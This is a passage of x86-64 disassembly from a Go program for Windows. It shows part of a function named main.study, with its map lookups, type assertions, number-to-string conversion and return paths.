   1402772f7:	e9 0b ff ff ff       	jmp    0x140277207
   1402772fc:	4a 8b 4c 1a 10       	mov    rcx,QWORD PTR [rdx+r11*1+0x10]
   140277301:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140277308:	00 
   140277309:	48 85 d2             	test   rdx,rdx
   14027730c:	e9 f6 fe ff ff       	jmp    0x140277207
   140277311:	4d 89 c1             	mov    r9,r8
   140277314:	49 21 f8             	and    r8,rdi
   140277317:	49 c1 e0 04          	shl    r8,0x4
   14027731b:	4e 8b 54 06 08       	mov    r10,QWORD PTR [rsi+r8*1+0x8]
   140277320:	49 39 da             	cmp    r10,rbx
   140277323:	74 20                	je     0x140277345
   140277325:	4d 8d 41 01          	lea    r8,[r9+0x1]
   140277329:	4d 85 d2             	test   r10,r10
   14027732c:	75 e3                	jne    0x140277311
   14027732e:	48 8d 05 7b a9 38 00 	lea    rax,[rip+0x38a97b]        # 0x140601cb0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140277335:	e8 e6 b5 d9 ff       	call   0x140012920 <runtime.typeAssert>
   14027733a:	48 89 c2             	mov    rdx,rax
   14027733d:	0f 1f 00             	nop    DWORD PTR [rax]
   140277340:	e9 14 fe ff ff       	jmp    0x140277159
   140277345:	4a 8b 5c 06 10       	mov    rbx,QWORD PTR [rsi+r8*1+0x10]
   14027734a:	48 89 da             	mov    rdx,rbx
   14027734d:	e9 07 fe ff ff       	jmp    0x140277159
   140277352:	49 89 f8             	mov    r8,rdi
   140277355:	48 21 f7             	and    rdi,rsi
   140277358:	48 c1 e7 04          	shl    rdi,0x4
   14027735c:	4c 8b 4c 3a 08       	mov    r9,QWORD PTR [rdx+rdi*1+0x8]
   140277361:	49 39 d9             	cmp    r9,rbx
   140277364:	74 30                	je     0x140277396
   140277366:	49 8d 78 01          	lea    rdi,[r8+0x1]
   14027736a:	4d 85 c9             	test   r9,r9
   14027736d:	75 e3                	jne    0x140277352
   14027736f:	48 8d 05 1a a9 38 00 	lea    rax,[rip+0x38a91a]        # 0x140601c90 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140277376:	e8 a5 b5 d9 ff       	call   0x140012920 <runtime.typeAssert>
   14027737b:	48 8b 94 24 10 01 00 	mov    rdx,QWORD PTR [rsp+0x110]
   140277382:	00 
   140277383:	48 85 d2             	test   rdx,rdx
   140277386:	48 89 c1             	mov    rcx,rax
   140277389:	48 8b 84 24 90 00 00 	mov    rax,QWORD PTR [rsp+0x90]
   140277390:	00 
   140277391:	e9 a2 fd ff ff       	jmp    0x140277138
   140277396:	48 8b 74 3a 10       	mov    rsi,QWORD PTR [rdx+rdi*1+0x10]
   14027739b:	48 8b 94 24 10 01 00 	mov    rdx,QWORD PTR [rsp+0x110]
   1402773a2:	00 
   1402773a3:	48 85 d2             	test   rdx,rdx
   1402773a6:	48 89 c8             	mov    rax,rcx
   1402773a9:	48 89 f1             	mov    rcx,rsi
   1402773ac:	e9 87 fd ff ff       	jmp    0x140277138
   1402773b1:	4d 89 c1             	mov    r9,r8
   1402773b4:	49 21 f8             	and    r8,rdi
   1402773b7:	49 c1 e0 04          	shl    r8,0x4
   1402773bb:	4e 8b 54 06 08       	mov    r10,QWORD PTR [rsi+r8*1+0x8]
   1402773c0:	49 39 d2             	cmp    r10,rdx
   1402773c3:	74 20                	je     0x1402773e5
   1402773c5:	4d 8d 41 01          	lea    r8,[r9+0x1]
   1402773c9:	4d 85 d2             	test   r10,r10
   1402773cc:	75 e3                	jne    0x1402773b1
   1402773ce:	48 8d 05 9b a8 38 00 	lea    rax,[rip+0x38a89b]        # 0x140601c70 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402773d5:	48 89 d3             	mov    rbx,rdx
   1402773d8:	e8 43 b5 d9 ff       	call   0x140012920 <runtime.typeAssert>
   1402773dd:	48 89 c1             	mov    rcx,rax
   1402773e0:	e9 b1 fc ff ff       	jmp    0x140277096
   1402773e5:	4a 8b 54 06 10       	mov    rdx,QWORD PTR [rsi+r8*1+0x10]
   1402773ea:	48 89 d1             	mov    rcx,rdx
   1402773ed:	e9 a4 fc ff ff       	jmp    0x140277096
   1402773f2:	48 89 8c 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rcx
   1402773f9:	00 
   1402773fa:	48 8d 05 3f 1a 08 00 	lea    rax,[rip+0x81a3f]        # 0x1402f8e40 '\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xf0\\xacz\x00\n\x01\x01\x11\\xb0I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00NB\x00\x00\x00\x00\x00\x00\x00S/@\x01\x00\x00\x00\\xa0\x1e/@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00'
   140277401:	e8 fa ef d9 ff       	call   0x140016400 <runtime.newobject>
   140277406:	c6 00 01             	mov    BYTE PTR [rax],0x1
   140277409:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   140277410:	00 
   140277411:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   140277415:	48 89 c3             	mov    rbx,rax
   140277418:	bf 01 00 00 00       	mov    edi,0x1
   14027741d:	48 8b 84 24 18 01 00 	mov    rax,QWORD PTR [rsp+0x118]
   140277424:	00 
   140277425:	48 89 ca             	mov    rdx,rcx
   140277428:	48 89 f9             	mov    rcx,rdi
   14027742b:	ff d2                	call   rdx
   14027742d:	c6 44 24 5f 00       	mov    BYTE PTR [rsp+0x5f],0x0
   140277432:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   140277439:	00 
   14027743a:	48 8b 0a             	mov    rcx,QWORD PTR [rdx]
   14027743d:	ff d1                	call   rcx
   14027743f:	48 81 c4 00 01 00 00 	add    rsp,0x100
   140277446:	5d                   	pop    rbp
   140277447:	c3                   	ret
   140277448:	48 89 cf             	mov    rdi,rcx
   14027744b:	48 21 f1             	and    rcx,rsi
   14027744e:	48 c1 e1 04          	shl    rcx,0x4
   140277452:	4c 8b 44 0a 08       	mov    r8,QWORD PTR [rdx+rcx*1+0x8]
   140277457:	49 39 d8             	cmp    r8,rbx
   14027745a:	74 1d                	je     0x140277479
   14027745c:	48 8d 4f 01          	lea    rcx,[rdi+0x1]
   140277460:	4d 85 c0             	test   r8,r8
   140277463:	75 e3                	jne    0x140277448
   140277465:	48 8d 05 e4 a7 38 00 	lea    rax,[rip+0x38a7e4]        # 0x140601c50 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   14027746c:	e8 af b4 d9 ff       	call   0x140012920 <runtime.typeAssert>
   140277471:	48 89 c1             	mov    rcx,rax
   140277474:	e9 79 ff ff ff       	jmp    0x1402773f2
   140277479:	48 8b 4c 0a 10       	mov    rcx,QWORD PTR [rdx+rcx*1+0x10]
   14027747e:	66 90                	xchg   ax,ax
   140277480:	e9 6d ff ff ff       	jmp    0x1402773f2
   140277485:	49 83 c0 30          	add    r8,0x30
   140277489:	44 88 44 0c 4e       	mov    BYTE PTR [rsp+rcx*1+0x4e],r8b
   14027748e:	48 89 f8             	mov    rax,rdi
   140277491:	48 89 f1             	mov    rcx,rsi
   140277494:	48 85 d2             	test   rdx,rdx
   140277497:	7e 31                	jle    0x1402774ca
   140277499:	48 8d 71 ff          	lea    rsi,[rcx-0x1]
   14027749d:	48 89 c7             	mov    rdi,rax
   1402774a0:	48 b8 cd cc cc cc cc 	movabs rax,0xcccccccccccccccd
   1402774a7:	cc cc cc 
   1402774aa:	49 89 d0             	mov    r8,rdx
   1402774ad:	48 f7 ea             	imul   rdx
   1402774b0:	4c 01 c2             	add    rdx,r8
   1402774b3:	48 c1 fa 03          	sar    rdx,0x3
   1402774b7:	4c 8d 0c 12          	lea    r9,[rdx+rdx*1]
   1402774bb:	4f 8d 0c 89          	lea    r9,[r9+r9*4]
   1402774bf:	4d 29 c8             	sub    r8,r9
   1402774c2:	48 83 fe 10          	cmp    rsi,0x10
   1402774c6:	72 bd                	jb     0x140277485
   1402774c8:	eb 51                	jmp    0x14027751b
   1402774ca:	48 83 f9 10          	cmp    rcx,0x10
   1402774ce:	77 3e                	ja     0x14027750e
   1402774d0:	48 8d 51 f0          	lea    rdx,[rcx-0x10]
   1402774d4:	48 89 d6             	mov    rsi,rdx
   1402774d7:	48 f7 da             	neg    rdx
   1402774da:	48 c1 fe 3f          	sar    rsi,0x3f
   1402774de:	48 21 f1             	and    rcx,rsi
   1402774e1:	48 8d 5c 0c 4f       	lea    rbx,[rsp+rcx*1+0x4f]
   1402774e6:	48 8d 44 24 60       	lea    rax,[rsp+0x60]
   1402774eb:	48 89 d1             	mov    rcx,rdx
   1402774ee:	e8 8d 30 de ff       	call   0x14005a580 <runtime.slicebytetostring>
   1402774f3:	48 89 d9             	mov    rcx,rbx
   1402774f6:	48 89 c2             	mov    rdx,rax
   1402774f9:	48 8b 84 24 a0 00 00 	mov    rax,QWORD PTR [rsp+0xa0]
   140277500:	00 
   140277501:	48 8b 9c 24 88 00 00 	mov    rbx,QWORD PTR [rsp+0x88]
   140277508:	00 
   140277509:	e9 25 fa ff ff       	jmp    0x140276f33
   14027750e:	48 89 c8             	mov    rax,rcx
   140277511:	b9 10 00 00 00       	mov    ecx,0x10
   140277516:	e8 85 37 e0 ff       	call   0x14007aca0 <runtime.panicSliceB>
   14027751b:	48 89 f0             	mov    rax,rsi
   14027751e:	b9 10 00 00 00       	mov    ecx,0x10
   140277523:	e8 b8 36 e0 ff       	call   0x14007abe0 <runtime.panicIndex>
   140277528:	48 89 8c 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rcx
   14027752f:	00 
   140277530:	48 8d 05 09 19 08 00 	lea    rax,[rip+0x81909]        # 0x1402f8e40 '\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xf0\\xacz\x00\n\x01\x01\x11\\xb0I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00NB\x00\x00\x00\x00\x00\x00\x00S/@\x01\x00\x00\x00\\xa0\x1e/@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00'
   140277537:	e8 c4 ee d9 ff       	call   0x140016400 <runtime.newobject>
   14027753c:	c6 00 01             	mov    BYTE PTR [rax],0x1
   14027753f:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   140277546:	00 
   140277547:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   14027754b:	48 89 c3             	mov    rbx,rax
   14027754e:	bf 01 00 00 00       	mov    edi,0x1
   140277553:	48 8b 84 24 18 01 00 	mov    rax,QWORD PTR [rsp+0x118]
   14027755a:	00 
   14027755b:	48 89 ca             	mov    rdx,rcx
   14027755e:	48 89 f9             	mov    rcx,rdi
   140277561:	ff d2                	call   rdx
   140277563:	c6 44 24 5f 00       	mov    BYTE PTR [rsp+0x5f],0x0
   140277568:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   14027756f:	00 
   140277570:	48 8b 0a             	mov    rcx,QWORD PTR [rdx]
   140277573:	ff d1                	call   rcx
   140277575:	48 81 c4 00 01 00 00 	add    rsp,0x100
   14027757c:	5d                   	pop    rbp
   14027757d:	c3                   	ret
   14027757e:	48 89 cf             	mov    rdi,rcx
   140277581:	48 21 f1             	and    rcx,rsi
   140277584:	48 c1 e1 04          	shl    rcx,0x4
   140277588:	4c 8b 44 0a 08       	mov    r8,QWORD PTR [rdx+rcx*1+0x8]
   14027758d:	49 39 d8             	cmp    r8,rbx
   140277590:	74 1d                	je     0x1402775af
   140277592:	48 8d 4f 01          	lea    rcx,[rdi+0x1]
   140277596:	4d 85 c0             	test   r8,r8
   140277599:	75 e3                	jne    0x14027757e
   14027759b:	48 8d 05 8e a6 38 00 	lea    rax,[rip+0x38a68e]        # 0x140601c30 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402775a2:	e8 79 b3 d9 ff       	call   0x140012920 <runtime.typeAssert>
   1402775a7:	48 89 c1             	mov    rcx,rax
   1402775aa:	e9 79 ff ff ff       	jmp    0x140277528
   1402775af:	48 8b 4c 0a 10       	mov    rcx,QWORD PTR [rdx+rcx*1+0x10]
   1402775b4:	e9 6f ff ff ff       	jmp    0x140277528
   1402775b9:	49 89 f8             	mov    r8,rdi
   1402775bc:	48 21 f7             	and    rdi,rsi
   1402775bf:	48 c1 e7 04          	shl    rdi,0x4
   1402775c3:	4c 8b 4c 3a 08       	mov    r9,QWORD PTR [rdx+rdi*1+0x8]
   1402775c8:	49 39 c9             	cmp    r9,rcx
   1402775cb:	74 25                	je     0x1402775f2
   1402775cd:	49 8d 78 01          	lea    rdi,[r8+0x1]
   1402775d1:	4d 85 c9             	test   r9,r9
   1402775d4:	75 e3                	jne    0x1402775b9
   1402775d6:	48 8d 05 33 a6 38 00 	lea    rax,[rip+0x38a633]        # 0x140601c10 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402775dd:	48 89 cb             	mov    rbx,rcx
   1402775e0:	e8 3b b3 d9 ff       	call   0x140012920 <runtime.typeAssert>
   1402775e5:	48 8b 9c 24 18 01 00 	mov    rbx,QWORD PTR [rsp+0x118]
   1402775ec:	00 
   1402775ed:	e9 da f8 ff ff       	jmp    0x140276ecc
   1402775f2:	48 8b 4c 3a 10       	mov    rcx,QWORD PTR [rdx+rdi*1+0x10]
   1402775f7:	48 89 c8             	mov    rax,rcx
   1402775fa:	e9 cd f8 ff ff       	jmp    0x140276ecc
   1402775ff:	90                   	nop
   140277600:	e8 db 64 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140277605:	48 81 c4 00 01 00 00 	add    rsp,0x100
   14027760c:	5d                   	pop    rbp
   14027760d:	c3                   	ret
   14027760e:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
   140277613:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
   140277618:	e8 03 13 e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   14027761d:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
   140277622:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
   140277627:	e9 14 f8 ff ff       	jmp    0x140276e40 <main.study>
   14027762c:	cc                   	int3
   14027762d:	cc                   	int3
   14027762e:	cc                   	int3
   14027762f:	cc                   	int3
   140277630:	cc                   	int3
   140277631:	cc                   	int3
   140277632:	cc                   	int3
   140277633:	cc                   	int3
   140277634:	cc                   	int3
   140277635:	cc                   	int3
   140277636:	cc                   	int3
   140277637:	cc                   	int3
   140277638:	cc                   	int3
   140277639:	cc                   	int3
   14027763a:	cc                   	int3
   14027763b:	cc                   	int3
   14027763c:	cc                   	int3
   14027763d:	cc                   	int3
   14027763e:	cc                   	int3
   14027763f:	cc                   	int3
